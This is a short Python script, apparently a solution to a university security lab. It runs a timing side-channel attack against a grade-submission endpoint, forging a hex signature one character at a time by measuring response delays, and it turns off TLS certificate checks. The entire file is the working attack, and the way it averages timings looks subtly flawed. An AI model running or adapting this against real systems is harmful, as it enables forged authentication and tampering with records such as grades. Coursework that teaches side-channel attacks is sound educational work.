import requests
from statistics import mean
import urllib3

hex_array = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f']

url_base = "https://eitn41.eit.lth.se:3119/ha4/addgrade.php"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

name = 'Kalle'
grade = '5'
signature = ''
finished_signature = ''
parameters = {'name': name, 'grade': grade, 'signature': signature}

base_values = []
for j in range(10):
    result = requests.get(url_base, params=parameters, verify=False)
    base_values.append(result.elapsed.microseconds)

base_mean = mean(base_values)
base_values.clear()

for i in range(20):
    print("i: ", i)
    for char in hex_array:
        signature += char
        parameters = {'name': name, 'grade': grade, 'signature': signature}
        for j in range(10):
            result = requests.get(url_base, params=parameters, verify=False)
            url = result.url
            base_values.append(result.elapsed.microseconds)

        print(url)
        print(f"Base values for {char}:", mean(base_values), base_mean)
        if mean(base_values) > base_mean + 2500:
            finished_signature += char
            print(finished_signature)
            base_mean = mean(base_values)
            base_values.clear()
            break
        signature = signature[:len(signature) - 1]

print(''.join(finished_signature))
